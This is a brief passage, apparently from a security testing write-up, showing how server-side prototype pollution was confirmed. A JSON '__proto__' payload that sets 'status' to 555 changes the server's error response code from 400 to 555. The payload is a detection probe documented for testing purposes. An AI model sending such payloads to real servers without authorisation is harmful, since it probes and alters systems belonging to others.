## Status manipulation

The following payload was used:

```json
"__proto__": {
  "status": 555
}
```

After triggering the JSON parsing error, the response changed from:

```json
"statusCode": 400,
"status": 400
```

to:

```json
"statusCode": 555,
"status": 555
```

This provided definitive evidence of server-side prototype pollution.

